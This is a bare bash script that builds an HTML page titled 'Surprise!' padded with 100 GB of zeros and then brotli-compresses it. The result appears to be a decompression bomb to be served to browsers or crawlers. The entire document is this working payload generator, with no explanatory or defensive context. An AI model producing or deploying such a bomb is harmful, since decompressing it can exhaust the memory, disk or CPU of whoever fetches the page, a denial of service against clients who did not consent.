#!/bin/bash

echo '<!DOCTYPE html><html><head><title>Surprise!</title></head><body>' > index.html
yes $'\x30' | tr -d '\n' | dd iflag=fullblock of=index.html bs=1G count=100 conv=notrunc oflag=append status=progress
string='<!DOCTYPE html><html><head><title>Surprise!</title></head><body></body></html>'; size=${#string}; truncate -s -$size index.html
echo '</body></html>' >> index.html
brotli --best index.html
